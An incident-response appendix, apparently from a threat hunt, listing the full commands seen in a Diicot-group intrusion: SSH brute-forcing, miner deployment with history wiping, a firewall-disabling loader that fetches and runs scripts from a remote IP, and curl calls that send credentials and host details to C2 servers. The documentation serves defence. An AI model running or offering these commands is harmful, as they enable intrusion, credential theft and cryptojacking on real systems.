# Observed Commands

This document contains full versions of commands observed during the post-incident analysis.  
Each command is linked from the findings sections for clarity and deeper technical context.

---

# 📂 Initial Threat Hunt Observations

---

## 🧩 .bisis SSH Brute-Force Command
(id: `bisis-ssh-brute-force-command`)

```bash
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```

**Description:**  
Hidden binary `.bisis` executing SSH brute-force attempts against target systems.  
Uses a timeout of 8 seconds per connection attempt and references an external configuration file (`data.json`).

---

## 🧩 .bisis Repeated Execution Command
(id: `bisis-repeated-execution-command`)

```bash
bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulimit -n 999999 ; cat iplist | ./bisis -f 20 -t 8 -T 20 -S 10 -p 22 -l root -o /var/tmp/.update-logs/.history -O /var/tmp/.update-logs/.history -i eth0 -d /var/tmp/.update-logs/iplist2 ; ./x"
```

**Description:**  
Launches `.bisis` with customized parameters (threads, timeout, SSH port, username) and starts a second payload (`x`) after brute-forcing.

---

## 🧩 ./network Multi-Stage Crypto Mining Script
(id: `network-multistage-script`)

```bash
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

**Description:**  
Complex script to eliminate competition, hide traces, deploy mining payloads, and set persistence through hidden directories.

---

## 🧩 ./retea Credential Harvester and Payload Dropper
(id: `retea-credential-dropper`)

```bash
./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
```

**Description:**  
Malicious script associated with the Diicot group; collects system info, builds credential dictionaries, wipes traces, downloads and executes secondary payloads.

---

## 🧩 ./UpzBUBnv Suspicious Binary Execution
(id: `upzbubnv-execution`)

```bash
./UpzBUBnv
```

**Description:**  
Hidden binary executed post-SSH connection; suspected malware based on behavior and association with SSH brute-force processes.

---

## 🧩 ./cache Crypto Miner Execution
(id: `cache-miner-execution`)

```bash
./cache
```

**Description:**  
Executable dropped from remote source, tied to crypto mining operations in the compromised network.

---

# 📂 MDE Dashboard Review Observations

---

## 🧩 curl Silent Data Exfiltration to C2
(id: `curl-silent-c2`)

```bash
curl --silent http://196.251.73.38:47/save-data?IP=45.64.186.20 -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language: en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --insecure
```

**Description:**  
Sends infected system's IP address to remote C2 server silently; uses browser headers to evade basic detection.

---

## 🧩 curl Downloading Malicious Payload (Black3)
(id: `curl-black3-download`)

```bash
curl -s --connect-timeout 15 digital.digitaldatainsights.org/.x/black3
```

**Description:**  
Silent download of suspected malicious payload (.x/black3) from known-malicious domain associated with Diicot group activity.

---

## 🧩 bash-based Firewall Disabling and Malware Loader
(id: `bash-firewall-disable-loader`)

```bash
bash -c "pkill firewalld -9; pkill iptables -9; ulimit -e 999999; ulimit -u 999999; ulimit -n 999999; cd /tmp || cd /run || cd /; rm -rf logsbins.sh; wget http://194.32.145.243/logsbins.sh; chmod 777 logsbins.sh; sh logsbins.sh; curl -o logsbins.sh http://194.32.145.243/logsbins.sh; chmod 777 logsbins.sh; sh logsbins.sh; tftp 194.32.145.243 -c get logstftp1.sh; chmod 777 logstftp1.sh; sh logstftp1.sh; tftp -r logstftp2.sh -g 194.32.145.243; chmod 777 logstftp2.sh; sh logstftp2.sh; rm -rf logsbins.sh logstftp1.sh logstftp2.sh; rm -rf *; cd; rm -rf .bash_history; history -c"
```

**Description:**  
Full disablement of firewall protections, retrieval and execution of multiple payloads, heavy use of log wiping to cover tracks.

---

## 🧩 curl Credential and System Info Exfiltration
(id: `curl-credential-exfil`)

```bash
curl --silent "http://87.120.116.35:8000/save-data?IP=54.177.195.166&USER=user1&PASS=*****&PORT=22&CPUS=4&HOSTN=awk: command not found &ARCHN=awk: command not found &KERN=awk: command not found &GPU=No" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language: en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --insecure
```

**Description:**  
Exfiltrates host metadata, usernames, credentials, and hardware details to remote malicious server over insecure connection.

---

# 📜 Notes

- Commands above were collected from both manual threat hunting and MDE incident dashboard review.
- Diicot threat group indicators dominate most stages of the attack lifecycle.
- Each script or command had a distinct role: reconnaissance, brute-force, persistence, cryptomining, or exfiltration.

